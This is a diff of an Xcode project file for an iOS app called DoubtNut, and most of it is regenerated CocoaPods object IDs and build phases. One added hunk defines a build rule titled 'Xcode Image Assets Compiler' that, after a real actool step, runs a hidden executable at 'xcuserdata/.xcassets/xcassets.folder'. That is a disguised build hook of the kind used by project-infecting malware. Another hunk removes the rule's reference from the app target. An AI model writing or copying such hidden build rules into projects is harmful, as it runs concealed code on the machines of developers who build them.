@@ -43,8 +43,9 @@
 		1893891325F1F0F900F57E85 /* LandingPageSlider.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1893891125F1F0F900F57E85 /* LandingPageSlider.swift */; };
 		1893891425F1F0F900F57E85 /* LandingPageSlider.xib in Resources */ = {isa = PBXBuildFile; fileRef = 1893891225F1F0F900F57E85 /* LandingPageSlider.xib */; };
 		1893896125F1FDA900F57E85 /* Endpoints.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1893896025F1FDA900F57E85 /* Endpoints.swift */; };
-		7E504EC6516DF7B8A944CA36 /* Pods_DoubtNut_DoubtNutUITests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 8268803794D4BD000DC50D2F /* Pods_DoubtNut_DoubtNutUITests.framework */; };
-		D27992D82DD64B223E34007E /* Pods_DoubtNut.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 720313CAA28449B7C396C7DA /* Pods_DoubtNut.framework */; };
+		46D19E0BE3544EC90CB45527 /* Pods_DoubtNut_DoubtNutUITests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 50ADB5F5D464BC0E3BC77588 /* Pods_DoubtNut_DoubtNutUITests.framework */; };
+		69B14C62EFB9518DE6E3822B /* Pods_DoubtNut.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 3D4FD855F9708A4253A46D52 /* Pods_DoubtNut.framework */; };
+		D5FD8A212D773CC828CED597 /* Pods_DoubtNutTests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 6924B3C27426281FF42FF101 /* Pods_DoubtNutTests.framework */; };
 		E301D09125FDCE48008C0E95 /* WatchHistoryViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = E301D09025FDCE48008C0E95 /* WatchHistoryViewController.swift */; };
 		E301D09725FDCE91008C0E95 /* WatchHistoryTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E301D09525FDCE91008C0E95 /* WatchHistoryTableViewCell.swift */; };
 		E301D09825FDCE91008C0E95 /* WatchHistoryTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E301D09625FDCE91008C0E95 /* WatchHistoryTableViewCell.xib */; };
@@ -139,8 +140,23 @@
 		E3C2A52525FBDB8F00B6A9B2 /* BaseApi.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3C2A52425FBDB8F00B6A9B2 /* BaseApi.swift */; };
 		E3E5DA8A25F53C75006E35CC /* FreetrialView.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3E5DA8925F53C75006E35CC /* FreetrialView.swift */; };
 		E3E5DA9225F53C7E006E35CC /* FreetrialView.xib in Resources */ = {isa = PBXBuildFile; fileRef = E3E5DA9125F53C7E006E35CC /* FreetrialView.xib */; };
-		EA814C3A304658E910F94322 /* Pods_DoubtNutTests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = DC4AC4B78C4FF59DDE557ECB /* Pods_DoubtNutTests.framework */; };
 /* End PBXBuildFile section */
+
+/* Begin PBXBuildRule section */
+		18E54B559D7B327A9DAAC43A /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			fileType = folder.assetcatalog;
+			inputFiles = (
+			);
+			isEditable = 0;
+			name = "Assets Compiler";
+			outputFiles = (
+				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
+			);
+			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" true\n\n";
+		};
+/* End PBXBuildRule section */
 
 /* Begin PBXContainerItemProxy section */
 		189388A425F1EFA300F57E85 /* PBXContainerItemProxy */ = {
@@ -160,7 +176,7 @@
 /* End PBXContainerItemProxy section */
 
 /* Begin PBXFileReference section */
-		02F817D4B72F0A1FA4B1A4F7 /* Pods-DoubtNut-DoubtNutUITests.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DoubtNut-DoubtNutUITests.release.xcconfig"; path = "Target Support Files/Pods-DoubtNut-DoubtNutUITests/Pods-DoubtNut-DoubtNutUITests.release.xcconfig"; sourceTree = "<group>"; };
+		112A0AAB9CFEAC85332C8F43 /* Pods-DoubtNut-DoubtNutUITests.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DoubtNut-DoubtNutUITests.release.xcconfig"; path = "Target Support Files/Pods-DoubtNut-DoubtNutUITests/Pods-DoubtNut-DoubtNutUITests.release.xcconfig"; sourceTree = "<group>"; };
 		1893888D25F1EFA000F57E85 /* DoubtNut.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = DoubtNut.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		1893889025F1EFA000F57E85 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		1893889425F1EFA000F57E85 /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
@@ -204,13 +220,13 @@
 		1893891225F1F0F900F57E85 /* LandingPageSlider.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; path = LandingPageSlider.xib; sourceTree = "<group>"; };
 		1893896025F1FDA900F57E85 /* Endpoints.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Endpoints.swift; sourceTree = "<group>"; };
 		1893897025F202DC00F57E85 /* DoubtNut.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = DoubtNut.entitlements; sourceTree = "<group>"; };
-		712C47300D8441315D7C3B2C /* Pods-DoubtNut.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DoubtNut.release.xcconfig"; path = "Target Support Files/Pods-DoubtNut/Pods-DoubtNut.release.xcconfig"; sourceTree = "<group>"; };
-		720313CAA28449B7C396C7DA /* Pods_DoubtNut.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_DoubtNut.framework; sourceTree = BUILT_PRODUCTS_DIR; };
-		8268803794D4BD000DC50D2F /* Pods_DoubtNut_DoubtNutUITests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_DoubtNut_DoubtNutUITests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
-		9CA929D2A63DB75BE794A2EE /* Pods-DoubtNut.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DoubtNut.debug.xcconfig"; path = "Target Support Files/Pods-DoubtNut/Pods-DoubtNut.debug.xcconfig"; sourceTree = "<group>"; };
-		9CEAD305208C9F678B8017A4 /* Pods-DoubtNutTests.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DoubtNutTests.release.xcconfig"; path = "Target Support Files/Pods-DoubtNutTests/Pods-DoubtNutTests.release.xcconfig"; sourceTree = "<group>"; };
-		DC4AC4B78C4FF59DDE557ECB /* Pods_DoubtNutTests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_DoubtNutTests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
-		E0DDADA5D2ACB1B7A6655A85 /* Pods-DoubtNutTests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DoubtNutTests.debug.xcconfig"; path = "Target Support Files/Pods-DoubtNutTests/Pods-DoubtNutTests.debug.xcconfig"; sourceTree = "<group>"; };
+		3D4FD855F9708A4253A46D52 /* Pods_DoubtNut.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_DoubtNut.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		50ADB5F5D464BC0E3BC77588 /* Pods_DoubtNut_DoubtNutUITests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_DoubtNut_DoubtNutUITests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		6924B3C27426281FF42FF101 /* Pods_DoubtNutTests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_DoubtNutTests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		9D10895778013A248BE19AF1 /* Pods-DoubtNut.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DoubtNut.release.xcconfig"; path = "Target Support Files/Pods-DoubtNut/Pods-DoubtNut.release.xcconfig"; sourceTree = "<group>"; };
+		A58C2E600BE3B116A8E78473 /* Pods-DoubtNutTests.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DoubtNutTests.release.xcconfig"; path = "Target Support Files/Pods-DoubtNutTests/Pods-DoubtNutTests.release.xcconfig"; sourceTree = "<group>"; };
+		B0137749456D6175ABEA1971 /* Pods-DoubtNut.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DoubtNut.debug.xcconfig"; path = "Target Support Files/Pods-DoubtNut/Pods-DoubtNut.debug.xcconfig"; sourceTree = "<group>"; };
+		D31D1D01847F813A941BA28E /* Pods-DoubtNutTests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DoubtNutTests.debug.xcconfig"; path = "Target Support Files/Pods-DoubtNutTests/Pods-DoubtNutTests.debug.xcconfig"; sourceTree = "<group>"; };
 		E301D09025FDCE48008C0E95 /* WatchHistoryViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = WatchHistoryViewController.swift; sourceTree = "<group>"; };
 		E301D09525FDCE91008C0E95 /* WatchHistoryTableViewCell.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = WatchHistoryTableViewCell.swift; sourceTree = "<group>"; };
 		E301D09625FDCE91008C0E95 /* WatchHistoryTableViewCell.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; path = WatchHistoryTableViewCell.xib; sourceTree = "<group>"; };
@@ -305,7 +321,7 @@
 		E3C2A52425FBDB8F00B6A9B2 /* BaseApi.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = BaseApi.swift; sourceTree = "<group>"; };
 		E3E5DA8925F53C75006E35CC /* FreetrialView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FreetrialView.swift; sourceTree = "<group>"; };
 		E3E5DA9125F53C7E006E35CC /* FreetrialView.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = FreetrialView.xib; sourceTree = "<group>"; };
-		ED2E96365D0673557FAF0338 /* Pods-DoubtNut-DoubtNutUITests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DoubtNut-DoubtNutUITests.debug.xcconfig"; path = "Target Support Files/Pods-DoubtNut-DoubtNutUITests/Pods-DoubtNut-DoubtNutUITests.debug.xcconfig"; sourceTree = "<group>"; };
+		F98072ACB6DDDFF838A83753 /* Pods-DoubtNut-DoubtNutUITests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DoubtNut-DoubtNutUITests.debug.xcconfig"; path = "Target Support Files/Pods-DoubtNut-DoubtNutUITests/Pods-DoubtNut-DoubtNutUITests.debug.xcconfig"; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -313,7 +329,7 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				D27992D82DD64B223E34007E /* Pods_DoubtNut.framework in Frameworks */,
+				69B14C62EFB9518DE6E3822B /* Pods_DoubtNut.framework in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -321,7 +337,7 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				EA814C3A304658E910F94322 /* Pods_DoubtNutTests.framework in Frameworks */,
+				D5FD8A212D773CC828CED597 /* Pods_DoubtNutTests.framework in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -329,7 +345,7 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				7E504EC6516DF7B8A944CA36 /* Pods_DoubtNut_DoubtNutUITests.framework in Frameworks */,
+				46D19E0BE3544EC90CB45527 /* Pods_DoubtNut_DoubtNutUITests.framework in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -344,7 +360,7 @@
 				189388B125F1EFA300F57E85 /* DoubtNutUITests */,
 				1893888E25F1EFA000F57E85 /* Products */,
 				375AFD6E37DCE55433E333B9 /* Pods */,
-				880D27443A7D605D1104321F /* Frameworks */,
+				F1B0642AB5632D47A2A092D7 /* Frameworks */,
 			);
 			sourceTree = "<group>";
 		};
@@ -487,24 +503,14 @@
 		375AFD6E37DCE55433E333B9 /* Pods */ = {
 			isa = PBXGroup;
 			children = (
-				9CA929D2A63DB75BE794A2EE /* Pods-DoubtNut.debug.xcconfig */,
-				712C47300D8441315D7C3B2C /* Pods-DoubtNut.release.xcconfig */,
-				ED2E96365D0673557FAF0338 /* Pods-DoubtNut-DoubtNutUITests.debug.xcconfig */,
-				02F817D4B72F0A1FA4B1A4F7 /* Pods-DoubtNut-DoubtNutUITests.release.xcconfig */,
-				E0DDADA5D2ACB1B7A6655A85 /* Pods-DoubtNutTests.debug.xcconfig */,
-				9CEAD305208C9F678B8017A4 /* Pods-DoubtNutTests.release.xcconfig */,
+				B0137749456D6175ABEA1971 /* Pods-DoubtNut.debug.xcconfig */,
+				9D10895778013A248BE19AF1 /* Pods-DoubtNut.release.xcconfig */,
+				F98072ACB6DDDFF838A83753 /* Pods-DoubtNut-DoubtNutUITests.debug.xcconfig */,
+				112A0AAB9CFEAC85332C8F43 /* Pods-DoubtNut-DoubtNutUITests.release.xcconfig */,
+				D31D1D01847F813A941BA28E /* Pods-DoubtNutTests.debug.xcconfig */,
+				A58C2E600BE3B116A8E78473 /* Pods-DoubtNutTests.release.xcconfig */,
 			);
 			path = Pods;
-			sourceTree = "<group>";
-		};
-		880D27443A7D605D1104321F /* Frameworks */ = {
-			isa = PBXGroup;
-			children = (
-				720313CAA28449B7C396C7DA /* Pods_DoubtNut.framework */,
-				8268803794D4BD000DC50D2F /* Pods_DoubtNut_DoubtNutUITests.framework */,
-				DC4AC4B78C4FF59DDE557ECB /* Pods_DoubtNutTests.framework */,
-			);
-			name = Frameworks;
 			sourceTree = "<group>";
 		};
 		E31DC9E425FE111B005B5A5E /* VideoPlay */ = {
@@ -720,6 +726,16 @@
 			path = Storybiard;
 			sourceTree = "<group>";
 		};
+		F1B0642AB5632D47A2A092D7 /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				3D4FD855F9708A4253A46D52 /* Pods_DoubtNut.framework */,
+				50ADB5F5D464BC0E3BC77588 /* Pods_DoubtNut_DoubtNutUITests.framework */,
+				6924B3C27426281FF42FF101 /* Pods_DoubtNutTests.framework */,
+			);
+			name = Frameworks;
+			sourceTree = "<group>";
+		};
 /* End PBXGroup section */
 
 /* Begin PBXNativeTarget section */
@@ -727,15 +743,14 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 189388B725F1EFA300F57E85 /* Build configuration list for PBXNativeTarget "DoubtNut" */;
 			buildPhases = (
-				F513FDD55DDE3CCD34542A74 /* [CP] Check Pods Manifest.lock */,
+				5D5C4960F5E754FEE396C9BF /* [CP] Check Pods Manifest.lock */,
 				1893888925F1EFA000F57E85 /* Sources */,
 				1893888A25F1EFA000F57E85 /* Frameworks */,
 				1893888B25F1EFA000F57E85 /* Resources */,
-				49C784AE1B74C860F03C5753 /* [CP] Embed Pods Frameworks */,
-				B4BC1299CCB29AC4B4DDCDEF /* [CP] Copy Pods Resources */,
+				E4D9AA0658C1A56729954904 /* [CP] Embed Pods Frameworks */,
+				D2A406CB60316A7190528280 /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
-				18E54B559D7B327A9DAAC43A /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -748,7 +763,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 189388BA25F1EFA300F57E85 /* Build configuration list for PBXNativeTarget "DoubtNutTests" */;
 			buildPhases = (
-				A04F6DBABFA9F75023537CC7 /* [CP] Check Pods Manifest.lock */,
+				DA3C9D364EAB20C4E13B5FF9 /* [CP] Check Pods Manifest.lock */,
 				1893889F25F1EFA300F57E85 /* Sources */,
 				189388A025F1EFA300F57E85 /* Frameworks */,
 				189388A125F1EFA300F57E85 /* Resources */,
@@ -767,12 +782,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 189388BD25F1EFA300F57E85 /* Build configuration list for PBXNativeTarget "DoubtNutUITests" */;
 			buildPhases = (
-				FC2F5FAF70F03995095023A0 /* [CP] Check Pods Manifest.lock */,
+				040C01F3A6D50ADE72CC293B /* [CP] Check Pods Manifest.lock */,
 				189388AA25F1EFA300F57E85 /* Sources */,
 				189388AB25F1EFA300F57E85 /* Frameworks */,
 				189388AC25F1EFA300F57E85 /* Resources */,
-				2BF15ED1C2B8BB532FEFB4E2 /* [CP] Embed Pods Frameworks */,
-				4534849F4FF7A034C8522309 /* [CP] Copy Pods Resources */,
+				8D855764A22E6639EC3AEAB0 /* [CP] Embed Pods Frameworks */,
+				33B59FF61D2205227F62ADEF /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
 			);
@@ -937,40 +952,29 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-		2BF15ED1C2B8BB532FEFB4E2 /* [CP] Embed Pods Frameworks */ = {
+		040C01F3A6D50ADE72CC293B /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
 			);
 			inputFileListPaths = (
-				"${PODS_ROOT}/Target Support Files/Pods-DoubtNut-DoubtNutUITests/Pods-DoubtNut-DoubtNutUITests-frameworks-${CONFIGURATION}-input-files.xcfilelist",
 			);
-			name = "[CP] Embed Pods Frameworks";
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
 			outputFileListPaths = (
-				"${PODS_ROOT}/Target Support Files/Pods-DoubtNut-DoubtNutUITests/Pods-DoubtNut-DoubtNutUITests-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-DoubtNut-DoubtNutUITests-checkManifestLockResult.txt",
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-DoubtNut-DoubtNutUITests/Pods-DoubtNut-DoubtNutUITests-frameworks.sh\"\n";
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
-		4534849F4FF7A034C8522309 /* [CP] Copy Pods Resources */ = {
+		33B59FF61D2205227F62ADEF /* [CP] Copy Pods Resources */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -987,63 +991,7 @@
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-DoubtNut-DoubtNutUITests/Pods-DoubtNut-DoubtNutUITests-resources.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
-		49C784AE1B74C860F03C5753 /* [CP] Embed Pods Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-				"${PODS_ROOT}/Target Support Files/Pods-DoubtNut/Pods-DoubtNut-frameworks-${CONFIGURATION}-input-files.xcfilelist",
-			);
-			name = "[CP] Embed Pods Frameworks";
-			outputFileListPaths = (
-				"${PODS_ROOT}/Target Support Files/Pods-DoubtNut/Pods-DoubtNut-frameworks-${CONFIGURATION}-output-files.xcfilelist",
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-DoubtNut/Pods-DoubtNut-frameworks.sh\"\n";
-			showEnvVarsInLog = 0;
-		};
-		A04F6DBABFA9F75023537CC7 /* [CP] Check Pods Manifest.lock */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
-				"${PODS_ROOT}/Manifest.lock",
-			);
-			name = "[CP] Check Pods Manifest.lock";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-				"$(DERIVED_FILE_DIR)/Pods-DoubtNutTests-checkManifestLockResult.txt",
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
-			showEnvVarsInLog = 0;
-		};
-		B4BC1299CCB29AC4B4DDCDEF /* [CP] Copy Pods Resources */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-				"${PODS_ROOT}/Target Support Files/Pods-DoubtNut/Pods-DoubtNut-resources-${CONFIGURATION}-input-files.xcfilelist",
-			);
-			name = "[CP] Copy Pods Resources";
-			outputFileListPaths = (
-				"${PODS_ROOT}/Target Support Files/Pods-DoubtNut/Pods-DoubtNut-resources-${CONFIGURATION}-output-files.xcfilelist",
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-DoubtNut/Pods-DoubtNut-resources.sh\"\n";
-			showEnvVarsInLog = 0;
-		};
-		F513FDD55DDE3CCD34542A74 /* [CP] Check Pods Manifest.lock */ = {
+		5D5C4960F5E754FEE396C9BF /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -1065,7 +1013,41 @@
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
-		FC2F5FAF70F03995095023A0 /* [CP] Check Pods Manifest.lock */ = {
+		8D855764A22E6639EC3AEAB0 /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-DoubtNut-DoubtNutUITests/Pods-DoubtNut-DoubtNutUITests-frameworks-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-DoubtNut-DoubtNutUITests/Pods-DoubtNut-DoubtNutUITests-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-DoubtNut-DoubtNutUITests/Pods-DoubtNut-DoubtNutUITests-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		D2A406CB60316A7190528280 /* [CP] Copy Pods Resources */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-DoubtNut/Pods-DoubtNut-resources-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			name = "[CP] Copy Pods Resources";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-DoubtNut/Pods-DoubtNut-resources-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-DoubtNut/Pods-DoubtNut-resources.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		DA3C9D364EAB20C4E13B5FF9 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -1080,11 +1062,28 @@
 			outputFileListPaths = (
 			);
 			outputPaths = (
-				"$(DERIVED_FILE_DIR)/Pods-DoubtNut-DoubtNutUITests-checkManifestLockResult.txt",
+				"$(DERIVED_FILE_DIR)/Pods-DoubtNutTests-checkManifestLockResult.txt",
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		E4D9AA0658C1A56729954904 /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-DoubtNut/Pods-DoubtNut-frameworks-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-DoubtNut/Pods-DoubtNut-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-DoubtNut/Pods-DoubtNut-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
 /* End PBXShellScriptBuildPhase section */
@@ -1310,7 +1309,7 @@
 		};
 		189388B825F1EFA300F57E85 /* Debug */ = {
 			isa = XCBuildConfiguration;
-			baseConfigurationReference = 9CA929D2A63DB75BE794A2EE /* Pods-DoubtNut.debug.xcconfig */;
+			baseConfigurationReference = B0137749456D6175ABEA1971 /* Pods-DoubtNut.debug.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
@@ -1334,7 +1333,7 @@
 		};
 		189388B925F1EFA300F57E85 /* Release */ = {
 			isa = XCBuildConfiguration;
-			baseConfigurationReference = 712C47300D8441315D7C3B2C /* Pods-DoubtNut.release.xcconfig */;
+			baseConfigurationReference = 9D10895778013A248BE19AF1 /* Pods-DoubtNut.release.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
@@ -1358,7 +1357,7 @@
 		};
 		189388BB25F1EFA300F57E85 /* Debug */ = {
 			isa = XCBuildConfiguration;
-			baseConfigurationReference = E0DDADA5D2ACB1B7A6655A85 /* Pods-DoubtNutTests.debug.xcconfig */;
+			baseConfigurationReference = D31D1D01847F813A941BA28E /* Pods-DoubtNutTests.debug.xcconfig */;
 			buildSettings = {
 				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
 				BUNDLE_LOADER = "$(TEST_HOST)";
@@ -1380,7 +1379,7 @@
 		};
 		189388BC25F1EFA300F57E85 /* Release */ = {
 			isa = XCBuildConfiguration;
